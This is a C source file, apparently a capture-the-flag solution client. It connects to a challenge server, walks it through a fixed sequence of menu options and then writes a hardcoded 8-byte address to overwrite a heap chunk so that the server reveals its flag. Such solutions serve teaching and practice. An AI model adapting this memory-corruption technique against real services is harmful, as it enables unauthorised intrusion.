/* 
 * client-challenge.c  
 *
 * usage: client-challenge <host> <port>
 *
 * compile: 
 *    gcc -g -fno-stack-protector client-challenge.c -o client-challenge
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h> 
#include <ctype.h>

#define BUFSIZE 1024

/* 
 * error - wrapper for perror
 */
void error(char *msg) {
    perror(msg);
    exit(0);
}

int createCliSocket(char *hostn, int port)
{
    int sfd, n;
    struct sockaddr_in saddr;
    struct hostent *server;
    
    /* socket: create the socket */
    sfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sfd < 0) 
        error("ERROR opening socket");

    /* gethostbyname: get the server's DNS entry */
    server = gethostbyname(hostn);
    if (server == NULL) {
        fprintf(stderr,"ERROR, no such host as %s\n", hostn);
        exit(0);
    }

    /* build the server's Internet address */
    bzero((char *) &saddr, sizeof(saddr));
    saddr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&saddr.sin_addr.s_addr, server->h_length);
    saddr.sin_port        = htons(port);

    /* connect: create a connection with the server */
    if (connect(sfd, (const struct sockaddr *) &saddr, sizeof(saddr)) < 0) 
      error("ERROR connecting");

    return sfd;
}

void sendOption(int sfd, char option) {
    char buf[2];
    buf[0] = option;
    buf[1] = '\0';
    write(sfd, buf, strlen(buf));
}

void readResponse(int sfd) {
    char buf[BUFSIZE];
    bzero(buf, BUFSIZE);
    read(sfd, buf, BUFSIZE);
    printf("%s\n", buf);
}

void overwriteChunkWithFlagAddress(int sfd) {
    char buf[8];   
    buf[0] = 0x50; 
    buf[1] = 0x55;
    buf[2] = 0x55;
    buf[3] = 0x55;
    buf[4] = 0x55;
    buf[5] = 0x55;
    buf[6] = 0x00;
    buf[7] = 0x00; 

    write(sfd, buf, 8);
}

/******************************************************
 * main()
 ******************************************************/

int main(int argc, char **argv) {
    int i, sfd, port, n, nbytes, stop = 0;
    char *hostname;
    char *p;
    char buf[BUFSIZE];
    char buf1[BUFSIZE];
    char msg[BUFSIZE];
    FILE *input;


    /* check command line arguments */
    if (argc != 3) {
       fprintf(stderr,"usage: %s <hostname> <port>\n", argv[0]);
       exit(0);
    }
    hostname = argv[1];
    port = atoi(argv[2]);

    /* Create the socket */
    sfd = createCliSocket(hostname, port);

    /* Reads the welcome message from the server */
    readResponse(sfd);

    /* Step 1 */
    sendOption(sfd, '2');  
    readResponse(sfd);

    /* Step 2 */
    sendOption(sfd, '1');  
    readResponse(sfd);

    /* Step 3 */
    sendOption(sfd, '3');  
    overwriteChunkWithFlagAddress(sfd);  
    readResponse(sfd);

    /* Step 4 */
    sendOption(sfd, '4'); 
    readResponse(sfd);

    close(sfd);
    return 0;
}
	
